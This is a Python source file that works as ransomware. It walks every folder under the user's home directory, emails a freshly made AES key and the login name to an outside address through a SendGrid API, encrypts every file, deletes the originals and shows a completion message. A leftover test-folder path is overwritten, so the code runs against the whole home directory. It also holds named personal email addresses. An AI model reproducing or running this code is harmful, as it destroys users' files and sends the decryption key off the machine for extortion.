import os
import shutil
import pyAesCrypt
import secrets
import tkinter as tk
from tkinter import messagebox
from pathlib import Path
import requests

folders_path = [
    str(os.path.join(Path.home(), "TesteRansonware"))
]
folders_path = []
for root, dirs, files in os.walk(os.path.expanduser("~")):
    for dir in dirs:
        folders_path.append(os.path.join(root, dir))

        
key = secrets.token_hex(16)

url = "https://rapidprod-sendgrid-v1.p.rapidapi.com/mail/send"

payload = {
    "personalizations": [
        {
            "to": [{"email": "pedro.gomes2@academico.ufpb.com.br"}],
            "subject": "Decryption Key for "+str(os.getlogin())
        }
    ],
    "from": {"email": "paulsaul621@gmail.com"},
    "content": [
        {
            "type": "text/plain",
            "value": str(key)
        }
    ]
}
headers = {
    "content-type": "application/json",
    "X-RapidAPI-Key": "GET YOUR OWN",
    "X-RapidAPI-Host": "rapidprod-sendgrid-v1.p.rapidapi.com"
}

response = requests.request("POST", url, json=payload, headers=headers)

# Encrypt every file in the folders
for folder_path in folders_path:
    for file in os.listdir(folder_path):
        bufferSize = 64*1024
        # Get the path for the current file
        file_path = os.path.join(folder_path, file)
        if not file.endswith(".aes"):
            # Encrypt the file
            pyAesCrypt.encryptFile(file_path, file_path+".aes", key, bufferSize)
            # Move the encrypted file
            destination_path = os.path.join(folder_path,"encrypted_"+file+".aes")
            shutil.move(file_path+".aes", destination_path)
            # Delete the original file
            os.remove(file_path)

            
root = tk.Tk()
root.withdraw()
root.geometry("{}x{}".format(root.winfo_screenwidth(), root.winfo_screenheight()))
messagebox.showinfo("Encryption Complete", "All files in the folders have been encrypted. ")
root.mainloop()